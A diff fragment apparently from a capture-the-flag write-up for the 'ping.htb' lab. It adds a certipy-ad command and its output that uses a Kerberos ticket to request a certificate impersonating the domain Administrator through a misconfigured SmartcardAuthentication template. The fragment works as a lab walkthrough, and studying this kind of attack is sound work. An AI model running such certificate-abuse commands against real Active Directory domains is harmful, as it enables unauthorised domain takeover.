@@ -1251,8 +1251,19 @@ This means that this user has full control over the template essentially allowin
 ```python
 ❯❯❯ export KRB5CCNAME=c.roberts.ccache
 
+❯❯❯ faketime -f +8h certipy-ad req -dc-ip 192.168.2.1 -dc-host dc1.ping.htb -target dc1.ping.htb -target-ip 192.168.2.1 -k -no-pass -ca 'PING-DC1-CA' -template 'SmartcardAuthentication' -upn 'Administrator@ping.htb' -sid 'S-1-5-21-750635624-2058721901-1932338391-500' 
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[*] Requesting certificate via RPC
+[*] Request ID is 20
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Administrator@ping.htb'
+[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
 ```
+
+Ill export the TGT for the user that now has enrollee rights 
 
 
 
